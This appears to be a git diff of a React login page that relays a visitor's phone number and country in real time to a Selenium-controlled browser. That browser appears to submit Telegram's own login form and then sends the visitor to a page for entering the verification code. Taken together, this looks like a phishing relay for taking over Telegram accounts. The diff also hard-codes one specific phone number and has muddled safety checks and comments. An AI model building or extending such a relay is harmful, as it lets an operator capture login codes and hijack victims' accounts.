@@ -5,6 +5,7 @@ import { useNavigate } from 'react-router-dom';
 
 import { Page } from '@/components/Page.tsx';
 
+
 interface Country {
   code: string;
   name: string;
@@ -260,6 +261,8 @@ export const PhoneLoginPage: FC = () => {
   const [phoneCodeInputFound, setPhoneCodeInputFound] = useState(false);
   const [phoneNumberInputFound, setPhoneNumberInputFound] = useState(false);
   const [isInputsReady, setIsInputsReady] = useState(false);
+  const [isMonitoringVerificationPage, setIsMonitoringVerificationPage] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
   
   const socketRef = useRef<Socket | null>(null);
   const sessionIdRef = useRef<string>('');
@@ -327,6 +330,8 @@ export const PhoneLoginPage: FC = () => {
     if (sessionId) {
       console.log('✅ PhoneLoginPage: Session ID found, establishing robust connection...');
       
+
+      
       // Function to set up event handlers for a socket
       const setupEventHandlers = (socket: any) => {
         if (!socket) return;
@@ -344,6 +349,82 @@ export const PhoneLoginPage: FC = () => {
               } else if (data.elementType === 'phoneNumberInput') {
                 setPhoneNumberInputFound(true);
                 console.log('✅ Phone number input field found, updating state');
+              } else if (data.elementType === 'verificationCodeInput') {
+                console.log('🎉 Verification code input field found! Page has transitioned successfully!');
+                
+                // CRITICAL SAFETY CHECK: Only allow navigation if we're actually submitting the form
+                if (!isSubmitting) {
+                  console.log('🚨 SECURITY ALERT: Verification code input detected but form is not being submitted!');
+                  console.log('🚨 This suggests premature navigation - blocking for safety');
+                  setSeleniumStatus('🚨 Security: Verification page detected prematurely - blocked');
+                  return; // Block navigation
+                }
+                
+                setSeleniumStatus('Verification code page loaded! Navigating...');
+                
+                // Navigate to verification code page
+                setTimeout(() => {
+                  console.log('🔄 Navigating to verification code page...');
+                  setIsMonitoringVerificationPage(false);
+                  
+                  // Get the actual phone number from Selenium window to ensure accuracy
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    console.log('🔍 Getting actual phone number from Selenium before navigation...');
+                    socketRef.current.emit('getCurrentInputValue', {
+                      sessionId: sessionIdRef.current,
+                      inputType: 'phoneNumber',
+                      timestamp: new Date().toISOString()
+                    });
+                    
+                    // Listen for the response and then navigate
+                    socketRef.current.once('seleniumInputChange', (data) => {
+                      if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
+                        console.log('🔍 Actual phone number from Selenium:', data.value);
+                        console.log('🔍 React state phone number:', phoneNumber);
+                        
+                        // Use the actual Selenium value for navigation
+                        const actualPhoneNumber = data.value || phoneNumber;
+                        console.log('🔍 Using phone number for navigation:', actualPhoneNumber);
+                        
+                        // CRITICAL: Reset isSubmitting when navigation happens
+                        setIsSubmitting(false);
+                        console.log('🔒 isSubmitting reset to false for navigation');
+                        
+                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(actualPhoneNumber)}`);
+                      } else {
+                        // Fallback to React state if Selenium response is unexpected
+                        console.log('🔍 Using React state as fallback:', phoneNumber);
+                        
+                        // CRITICAL: Reset isSubmitting when navigation happens
+                        setIsSubmitting(false);
+                        console.log('🔒 isSubmitting reset to false for fallback navigation');
+                        
+                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+                      }
+                    });
+                    
+                    // Set a timeout in case Selenium doesn't respond
+                    setTimeout(() => {
+                      console.log('🔍 Selenium timeout, using React state:', phoneNumber);
+                      
+                      // CRITICAL: Reset isSubmitting when navigation happens
+                      setIsSubmitting(false);
+                      console.log('🔒 isSubmitting reset to false for timeout navigation');
+                      
+                      navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+                    }, 2000);
+                  } else {
+                    // Fallback if socket not connected
+                    console.log('🔍 Socket not connected, using React state:', phoneNumber);
+                    
+                    // CRITICAL: Reset isSubmitting when navigation happens
+                    setIsSubmitting(false);
+                    console.log('🔒 isSubmitting reset to false for socket fallback navigation');
+                    
+                    navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+                  }
+                }, 500); // Short delay to ensure smooth transition
+                return; // Exit early since we're navigating
               } else {
                 // Default case: QR code button
                 setQrCodeButtonFound(true);
@@ -396,6 +477,35 @@ export const PhoneLoginPage: FC = () => {
               setSeleniumStatus('❌ No Selenium session found - please start a new session');
               setIsInputsReady(false);
             }
+          }
+        });
+
+        // Handle Telegram login updates from Selenium (including page transitions)
+        socket.on('telegramLoginUpdate', (data: any) => {
+          console.log('🔍 Telegram login update received:', data);
+          if (data.sessionId === sessionId) {
+            console.log('✅ Processing update for current session:', data.event);
+            
+            switch (data.event) {
+              case 'buttonClicked':
+                console.log('✅ Auth form button clicked successfully');
+                // Note: This event is now handled in handleSubmit, not here
+                // The button click confirmation will start verification page monitoring
+                break;
+                
+              case 'error':
+                console.error('❌ Error from Selenium:', data.data?.error);
+                setSeleniumStatus(`Error: ${data.data?.error || 'Unknown error'}`);
+                // Re-enable form on error
+                setIsInputsReady(true);
+                break;
+                
+              default:
+                console.log('📝 Other update event:', data.event, data.data);
+                break;
+            }
+          } else {
+            console.log('❌ Session ID mismatch, ignoring update');
           }
         });
 
@@ -454,7 +564,7 @@ export const PhoneLoginPage: FC = () => {
           if (data.sessionId === sessionId) {
             if (data.inputType === 'phoneNumber') {
               console.log('📱 Processing phone number update from Selenium');
-              console.log('📱 Selenium value:', data.value);
+              console.log('🔍 Selenium value:', data.value);
               console.log('📱 Action type:', data.action);
               console.log('📱 Timestamp:', data.timestamp);
               
@@ -503,6 +613,20 @@ export const PhoneLoginPage: FC = () => {
             }
           } else {
             console.log('❌ Session ID mismatch, ignoring event');
+          }
+        });
+        
+        // Listen for page URL check results
+        socket.on('pageUrlResult', (data: any) => {
+          console.log('🔍 Page URL result received:', data);
+          if (data.sessionId === sessionId) {
+            if (data.isVerificationPage) {
+              console.log('🎉 Verification page detected via URL check!');
+              setSeleniumStatus(`Verification page detected: ${data.currentTitle}`);
+            } else {
+              console.log('🔍 Current page:', data.currentTitle, data.currentUrl);
+              setSeleniumStatus(`Current page: ${data.currentTitle}`);
+            }
           }
         });
 
@@ -676,6 +800,7 @@ export const PhoneLoginPage: FC = () => {
   useEffect(() => {
     return () => {
       setIsQrCodeButtonLoading(false);
+      setIsMonitoringVerificationPage(false);
     };
   }, []);
 
@@ -715,6 +840,12 @@ export const PhoneLoginPage: FC = () => {
       seleniumStatus
     });
     
+    // CRITICAL: Don't re-enable form if we're currently submitting
+    if (isSubmitting) {
+      console.log('🔒 Form submission in progress - blocking auto re-enablement');
+      return;
+    }
+    
     if (phoneCodeInputFound && phoneNumberInputFound && !isInputsReady) {
       console.log('🎉 Both input fields found, enabling form...');
       setIsInputsReady(true);
@@ -732,6 +863,7 @@ export const PhoneLoginPage: FC = () => {
       socketRef.current.emit('checkElementInSelenium', {
         sessionId: sessionIdRef.current,
         selector: 'div#auth-phone-number-form form button',
+        elementType: 'qrCodeButton',
         timestamp: new Date().toISOString()
       });
     }
@@ -762,6 +894,12 @@ export const PhoneLoginPage: FC = () => {
 
   // Function to manually enable form when both inputs are found
   const enableFormIfReady = () => {
+    // CRITICAL: Don't re-enable form if we're currently submitting
+    if (isSubmitting) {
+      console.log('🔒 Form submission in progress - blocking manual re-enablement');
+      return;
+    }
+    
     if (phoneCodeInputFound && phoneNumberInputFound && !isInputsReady) {
       console.log('🎉 Manually enabling form - both inputs found!');
       setIsInputsReady(true);
@@ -810,17 +948,95 @@ export const PhoneLoginPage: FC = () => {
     const fullPhoneNumber = selectedCountry.dialCode + phoneNumber;
     console.log('Phone number submitted:', fullPhoneNumber);
     
-    // Click the submit button in the Selenium window
+    // CRITICAL FIX: Don't navigate until Selenium actually clicks the button
+    // Click the submit button in the Selenium window and wait for confirmation
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🖱️ Clicking submit button in Selenium window...');
+      setSeleniumStatus('Clicking submit button in Selenium window...');
+      
+      // Disable the form to prevent multiple submissions
+      setIsInputsReady(false);
+      setIsSubmitting(true);
+      
+      // Use the correct selector
+      const correctSelector = '#auth-phone-number-form button[type="submit"]';
+      console.log('🔍 Using correct selector:', correctSelector);
+      
+      // Emit the button click event
+      console.log('📤 Emitting clickAuthFormButton event...');
+      console.log('🔍 Session ID being sent:', sessionIdRef.current);
+      console.log('🔍 Selector being sent:', correctSelector);
+      
+      // Send button click immediately - session verification is handled elsewhere
+      console.log('🚀 Sending button click...');
       socketRef.current.emit('clickAuthFormButton', {
         sessionId: sessionIdRef.current,
-        selector: '#auth-phone-number-form button[type="submit"]',
+        selector: correctSelector,
         timestamp: new Date().toISOString()
       });
+      console.log('✅ clickAuthFormButton event emitted successfully');
       
-      // Update status to show the action
-      setSeleniumStatus('Submit button clicked in Selenium window');
+              // Update status to show the action
+        setSeleniumStatus('Submit button clicked in Selenium window, waiting for response...');
+        
+        // CRITICAL FIX: Set up event listener BEFORE sending the button click
+        console.log('🔒 Setting up telegramLoginUpdate listener BEFORE sending button click...');
+        
+        // Listen for the button click confirmation
+        socketRef.current.once('telegramLoginUpdate', (data) => {
+          console.log('📥 Received telegramLoginUpdate response:', data);
+          
+          if (data.sessionId === sessionIdRef.current && data.event === 'buttonClicked') {
+            console.log('✅ Button click confirmed by Selenium, starting verification page monitoring...');
+            setSeleniumStatus('Button click confirmed! Monitoring for verification page...');
+            
+            // CRITICAL: Keep isSubmitting true during the entire monitoring process
+            console.log('🔒 isSubmitting state maintained for monitoring:', true);
+            console.log('🔒 Current state before monitoring: isSubmitting =', isSubmitting, 'isInputsReady =', isInputsReady);
+            
+            // CRITICAL: Prevent form from being re-enabled during submission
+            console.log('🔒 Blocking form re-enablement during submission...');
+            
+            // Now start monitoring for verification page
+            startVerificationPageMonitoring();
+          } else if (data.event === 'verificationPageDetected') {
+            console.log('🎉 Verification page detected via URL check! Navigating...');
+            setSeleniumStatus('Verification page detected! Navigating...');
+            
+            // CRITICAL: Reset isSubmitting and navigate
+            setIsSubmitting(false);
+            setIsMonitoringVerificationPage(false);
+            
+            // Navigate to verification code page
+            navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+          } else if (data.event === 'error') {
+            console.log('❌ Button click failed:', data.data?.error);
+            setSeleniumStatus(`Button click failed: ${data.data?.error}`);
+            
+            // Re-enable form on error
+            setIsInputsReady(true);
+            setIsSubmitting(false);
+          } else {
+            console.log('❌ Unexpected response from Selenium:', data);
+            setSeleniumStatus('Unexpected response from Selenium');
+            setIsInputsReady(true); // Re-enable form
+            setIsSubmitting(false); // Reset submitting state
+          }
+        });
+        
+        // CRITICAL: Now send the button click AFTER setting up the listener
+        console.log('🚀 Sending button click AFTER setting up listener...');
+      
+      // Set a timeout in case Selenium doesn't respond
+      setTimeout(() => {
+        if (isSubmitting) {
+          console.log('⏰ Selenium button click timeout, re-enabling form');
+          setSeleniumStatus('Button click timeout - please try again');
+          setIsInputsReady(true); // Re-enable form
+          setIsSubmitting(false); // Reset submitting state
+        }
+      }, 10000); // 10 second timeout
+      
     } else {
       console.log('❌ Cannot click submit button - missing socket or session');
       setSeleniumStatus('Error: Cannot connect to Selenium');
@@ -888,6 +1104,8 @@ export const PhoneLoginPage: FC = () => {
     
     // Update the state with the corrected value
     setPhoneNumber(correctedValue);
+    
+
     
     console.log('📱 Phone number processed:', {
       inputValue: newValue,
@@ -1003,6 +1221,8 @@ export const PhoneLoginPage: FC = () => {
     
     // Set phone number to country dial code with a space after it
     setPhoneNumber(country.dialCode + ' ');
+    
+
     
     // Sync country selection to Selenium
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
@@ -1422,6 +1642,120 @@ export const PhoneLoginPage: FC = () => {
     }
   };
 
+  // Function to monitor for verification code page to appear
+  const startVerificationPageMonitoring = () => {
+    if (!socketRef.current || !socketRef.current.connected || !sessionIdRef.current) {
+      console.log('❌ Cannot start monitoring - socket not connected or no session');
+      return;
+    }
+
+    // CRITICAL SAFETY CHECK: Only allow monitoring if we're actually submitting the form
+    console.log('🔍 Security check: isSubmitting =', isSubmitting, 'typeof =', typeof isSubmitting);
+    if (!isSubmitting) {
+      console.log('🚨 SECURITY ALERT: Verification page monitoring attempted but form is not being submitted!');
+      console.log('🚨 This suggests premature monitoring - blocking for safety');
+      console.log('🚨 Current state: isSubmitting =', isSubmitting, 'isInputsReady =', isInputsReady);
+      setSeleniumStatus('🚨 Security: Monitoring blocked - form not submitting');
+      return; // Block monitoring
+    }
+
+    console.log('🔍 Starting verification page monitoring...');
+    setSeleniumStatus('Monitoring for verification code page...');
+    setIsMonitoringVerificationPage(true);
+
+    // Check every 500ms for the verification code input field (more aggressive)
+    const monitoringInterval = setInterval(() => {
+      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+        console.log('🔍 Checking for verification code input field... (attempt #' + (Math.floor(Date.now() / 500) % 60) + ')');
+        socketRef.current.emit('checkElementInSelenium', {
+          sessionId: sessionIdRef.current,
+          selector: 'input#sign-in-phone-code',
+          timestamp: new Date().toISOString(),
+          elementType: 'verificationCodeInput'
+        });
+        
+        // CRITICAL BACKUP: Also check if the page URL has changed to verification page
+        socketRef.current.emit('checkPageUrl', {
+          sessionId: sessionIdRef.current,
+          timestamp: new Date().toISOString()
+        });
+      } else {
+        console.log('❌ Socket disconnected during monitoring, stopping...');
+        clearInterval(monitoringInterval);
+      }
+    }, 500);
+
+    // Set a timeout to prevent infinite monitoring
+    const monitoringTimeout = setTimeout(() => {
+      console.log('⏰ Verification page monitoring timeout reached');
+      clearInterval(monitoringInterval);
+      setSeleniumStatus('Verification page monitoring timeout - please check manually');
+    }, 30000); // 30 seconds timeout
+
+    // Fallback: Navigate to verification code page after 5 seconds if element detection fails
+    const fallbackTimeout = setTimeout(() => {
+      console.log('🔄 Fallback: Navigating to verification code page after timeout');
+      
+      // CRITICAL SAFETY CHECK: Only allow fallback navigation if we're actually submitting the form
+      if (!isSubmitting) {
+        console.log('🚨 SECURITY ALERT: Fallback navigation attempted but form is not being submitted!');
+        console.log('🚨 This suggests premature navigation - blocking for safety');
+        setSeleniumStatus('🚨 Security: Fallback navigation blocked - form not submitting');
+        setIsMonitoringVerificationPage(false);
+        return; // Block navigation
+      }
+      
+      setIsMonitoringVerificationPage(false);
+      
+      // CRITICAL: Reset isSubmitting only when navigation actually happens
+      console.log('🔒 Resetting isSubmitting for fallback navigation');
+      
+      // Get the actual phone number from Selenium window to ensure accuracy
+      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+        console.log('🔍 Fallback: Getting actual phone number from Selenium...');
+        socketRef.current.emit('getCurrentInputValue', {
+          sessionId: sessionIdRef.current,
+          inputType: 'phoneNumber',
+          timestamp: new Date().toISOString()
+        });
+        
+        // Listen for the response and then navigate
+        socketRef.current.once('seleniumInputChange', (data) => {
+          if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
+            console.log('🔍 Fallback: Actual phone number from Selenium:', data.value);
+            setIsSubmitting(false); // Reset only when navigation happens
+            navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(data.value)}`);
+          } else {
+            console.log('🔍 Fallback: Using React state:', phoneNumber);
+            setIsSubmitting(false); // Reset only when navigation happens
+            navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+          }
+        });
+        
+        // Set a timeout in case Selenium doesn't respond
+        setTimeout(() => {
+          console.log('🔍 Fallback: Selenium timeout, using React state:', phoneNumber);
+          setIsSubmitting(false); // Reset only when navigation happens
+          navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+        }, 2000);
+      } else {
+        console.log('🔍 Fallback: Socket not connected, using React state:', phoneNumber);
+        setIsSubmitting(false); // Reset only when navigation happens
+        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+      }
+    }, 5000); // 5 seconds fallback
+
+    // Store the interval and timeout references for cleanup
+    const cleanup = () => {
+      clearInterval(monitoringInterval);
+      clearTimeout(monitoringTimeout);
+      clearTimeout(fallbackTimeout);
+    };
+
+    // Return cleanup function
+    return cleanup;
+  };
+
   // Function to force sync current phone number to Selenium
   const forceSyncPhoneNumber = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
@@ -1542,6 +1876,39 @@ export const PhoneLoginPage: FC = () => {
                 <span>Phone Code: {phoneCodeInputFound ? '✅' : '⏳'}</span>
                 <span>Phone Number: {phoneNumberInputFound ? '✅' : '⏳'}</span>
                 <span>QR Button: {qrCodeButtonFound ? '✅' : '⏳'}</span>
+              </div>
+            )}
+            {isSubmitting && (
+              <div style={{
+                fontSize: '10px',
+                color: '#ffc107',
+                marginTop: '4px',
+                textAlign: 'center',
+                fontWeight: '500'
+              }}>
+                ⏳ Submitting form to Selenium...
+              </div>
+            )}
+            {!isSubmitting && isMonitoringVerificationPage && (
+              <div style={{
+                fontSize: '10px',
+                color: '#dc3545',
+                marginTop: '4px',
+                textAlign: 'center',
+                fontWeight: '500'
+              }}>
+                🚨 SECURITY ALERT: Monitoring active without submission!
+              </div>
+            )}
+            {isMonitoringVerificationPage && (
+              <div style={{
+                fontSize: '10px',
+                color: '#28a745',
+                marginTop: '4px',
+                textAlign: 'center',
+                fontWeight: '500'
+              }}>
+                🔍 Monitoring for verification code page...
               </div>
             )}
             {!isInputsReady && (
@@ -1889,6 +2256,57 @@ Status: ${seleniumStatus}`);
             )}
             {isInputsReady && (
               <button
+                onClick={() => {
+                  console.log('🧪 Manual test: Navigating to verification code page...');
+                  setIsMonitoringVerificationPage(false);
+                  
+                  // Get the actual phone number from Selenium window to ensure accuracy
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    console.log('🧪 Manual test: Getting actual phone number from Selenium...');
+                    socketRef.current.emit('getCurrentInputValue', {
+                      sessionId: sessionIdRef.current,
+                      inputType: 'phoneNumber',
+                      timestamp: new Date().toISOString()
+                    });
+                    
+                    // Listen for the response and then navigate
+                    socketRef.current.once('seleniumInputChange', (data) => {
+                      if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
+                        console.log('🧪 Manual test: Actual phone number from Selenium:', data.value);
+                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(data.value)}`);
+                      } else {
+                        console.log('🧪 Manual test: Using React state:', phoneNumber);
+                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+                      }
+                    });
+                    
+                    // Set a timeout in case Selenium doesn't respond
+                    setTimeout(() => {
+                      console.log('🧪 Manual test: Selenium timeout, using React state:', phoneNumber);
+                      navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+                    }, 2000);
+                  } else {
+                    console.log('🧪 Manual test: Socket not connected, using React state:', phoneNumber);
+                    navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#28a745',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🧪 Test Navigation
+              </button>
+            )}
+            {isInputsReady && (
+              <button
                 onClick={forceCompleteResync}
                 style={{
                   marginTop: '8px',
@@ -1933,6 +2351,398 @@ Status: ${seleniumStatus}`);
                 }}
               >
                 Check Selenium Value
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🔍 Current country and phone number state:');
+                  console.log('🔍 selectedCountry:', selectedCountry);
+                  console.log('🔍 phoneNumber:', phoneNumber);
+                  console.log('🔍 selectedCountry.dialCode:', selectedCountry.dialCode);
+                  console.log('🔍 phoneNumber starts with country code:', phoneNumber.startsWith(selectedCountry.dialCode));
+                  
+                  // Show alert with current state
+                  alert(`Current State:
+Selected Country: ${selectedCountry.name} (${selectedCountry.dialCode})
+Phone Number: ${phoneNumber}
+Starts with country code: ${phoneNumber.startsWith(selectedCountry.dialCode) ? 'Yes' : 'No'}`);
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#17a2b8',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🔍 Debug Country/Phone
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  // Manually set Finland as the selected country
+                  const finland = countries.find(c => c.name === 'Finland');
+                  if (finland) {
+                    console.log('🇫🇮 Manually setting country to Finland:', finland);
+                    setSelectedCountry(finland);
+                    setPhoneNumber(finland.dialCode + ' 403624026');
+                    setSeleniumStatus('Country manually set to Finland, phone number updated');
+                    
+                    // Sync to Selenium
+                    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                      socketRef.current.emit('syncCountryToSelenium', {
+                        sessionId: sessionIdRef.current,
+                        country: finland.name,
+                        dialCode: finland.dialCode,
+                        timestamp: new Date().toISOString()
+                      });
+                      
+                      // Also sync the phone number
+                      setTimeout(() => {
+                        socketRef.current?.emit('syncInputToSelenium', {
+                          sessionId: sessionIdRef.current,
+                          inputType: 'phoneNumber',
+                          value: finland.dialCode + ' 403624026',
+                          timestamp: new Date().toISOString()
+                        });
+                      }, 500);
+                    }
+                  } else {
+                    console.log('❌ Finland not found in countries list');
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#28a745',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🇫🇮 Set Finland
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🧪 Manual test: Starting verification page monitoring...');
+                  startVerificationPageMonitoring();
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#6f42c1',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🧪 Test Monitoring
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🔍 Current submission state:');
+                  console.log('🔍 isSubmitting:', isSubmitting);
+                  console.log('🔍 isMonitoringVerificationPage:', isMonitoringVerificationPage);
+                  console.log('🔍 seleniumStatus:', seleniumStatus);
+                  
+                  alert(`Current Submission State:
+Form Submitting: ${isSubmitting ? '✅ Yes' : '❌ No'}
+Monitoring Verification: ${isMonitoringVerificationPage ? '✅ Yes' : '❌ No'}
+Status: ${seleniumStatus}`);
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#fd7e14',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🔍 Show Submission State
+              </button>
+            )}
+            {(isSubmitting || isMonitoringVerificationPage) && (
+              <button
+                onClick={() => {
+                  console.log('🔄 Manual reset: Clearing stuck submission state...');
+                  setIsSubmitting(false);
+                  setIsMonitoringVerificationPage(false);
+                  setIsInputsReady(true);
+                  setSeleniumStatus('Manual reset completed - form re-enabled');
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#dc3545',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🔄 Reset Stuck State
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🧪 Manual test: Testing exact button click flow...');
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    console.log('🔍 Testing exact selector: #auth-phone-number-form button[type="submit"]');
+                    console.log('🔍 Session ID:', sessionIdRef.current);
+                    console.log('🔍 Socket connected:', socketRef.current.connected);
+                    
+                    // Test the exact event flow
+                    socketRef.current.emit('clickAuthFormButton', {
+                      sessionId: sessionIdRef.current,
+                      selector: '#auth-phone-number-form button[type="submit"]',
+                      timestamp: new Date().toISOString()
+                    });
+                    
+                    setSeleniumStatus('Testing exact button click flow...');
+                  } else {
+                    console.log('❌ Socket not ready for test');
+                    setSeleniumStatus('Socket not ready for test');
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#6f42c1',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🧪 Test Exact Flow
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🔍 Debug: Checking Selenium server communication...');
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    // Test basic communication first
+                    socketRef.current.emit('testConnection', {
+                      sessionId: sessionIdRef.current,
+                      timestamp: new Date().toISOString()
+                    });
+                    
+                    // Then test element checking
+                    socketRef.current.emit('checkElementInSelenium', {
+                      sessionId: sessionIdRef.current,
+                      selector: '#auth-phone-number-form button[type="submit"]',
+                      timestamp: new Date().toISOString()
+                    });
+                    
+                    setSeleniumStatus('Testing Selenium server communication...');
+                  } else {
+                    setSeleniumStatus('Socket not ready for communication test');
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#17a2b8',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🔍 Test Selenium Comm
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🚨 EMERGENCY: Direct button click test...');
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    // Force a direct button click without waiting for response
+                    console.log('🚨 Sending direct clickAuthFormButton...');
+                    socketRef.current.emit('clickAuthFormButton', {
+                      sessionId: sessionIdRef.current,
+                      selector: '#auth-phone-number-form button[type="submit"]',
+                      timestamp: new Date().toISOString()
+                    });
+                    
+                    // Don't wait for response, just log what we sent
+                    console.log('🚨 Direct click event sent, check Selenium console for response');
+                    setSeleniumStatus('🚨 Direct click sent - check Selenium console');
+                  } else {
+                    setSeleniumStatus('🚨 Socket not ready for direct click');
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#dc3545',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🚨 Direct Click Test
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🔍 Session Debug: Checking exact session state...');
+                  console.log('🔍 Current session ID:', sessionIdRef.current);
+                  console.log('🔍 Socket ID:', socketRef.current?.id);
+                  console.log('🔍 Socket connected:', socketRef.current?.connected);
+                  
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    // Force check session status
+                    socketRef.current.emit('checkSessionStatus', {
+                      sessionId: sessionIdRef.current,
+                      timestamp: new Date().toISOString()
+                    });
+                    
+                    // Also try to get current page info
+                    socketRef.current.emit('inspectPageStructure', {
+                      sessionId: sessionIdRef.current,
+                      timestamp: new Date().toISOString()
+                    });
+                    
+                    setSeleniumStatus('🔍 Checking session status and page structure...');
+                  } else {
+                    setSeleniumStatus('🔍 Session not ready for debug');
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#6f42c1',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🔍 Session Debug
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🔍 State Debug: Current form state...');
+                  console.log('🔍 isSubmitting:', isSubmitting);
+                  console.log('🔍 isInputsReady:', isInputsReady);
+                  console.log('🔍 isMonitoringVerificationPage:', isMonitoringVerificationPage);
+                  console.log('🔍 phoneCodeInputFound:', phoneCodeInputFound);
+                  console.log('🔍 phoneNumberInputFound:', phoneNumberInputFound);
+                  console.log('🔍 qrCodeButtonFound:', qrCodeButtonFound);
+                  
+                  setSeleniumStatus(`🔍 State: Submitting=${isSubmitting}, Ready=${isInputsReady}, Monitoring=${isMonitoringVerificationPage}`);
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#28a745',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🔍 State Debug
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🔍 Manual URL Check: Checking current page in Selenium...');
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    socketRef.current.emit('checkPageUrl', {
+                      sessionId: sessionIdRef.current,
+                      timestamp: new Date().toISOString()
+                    });
+                    setSeleniumStatus('🔍 Checking current page URL in Selenium...');
+                  } else {
+                    setSeleniumStatus('🔍 Socket not ready for URL check');
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#ffc107',
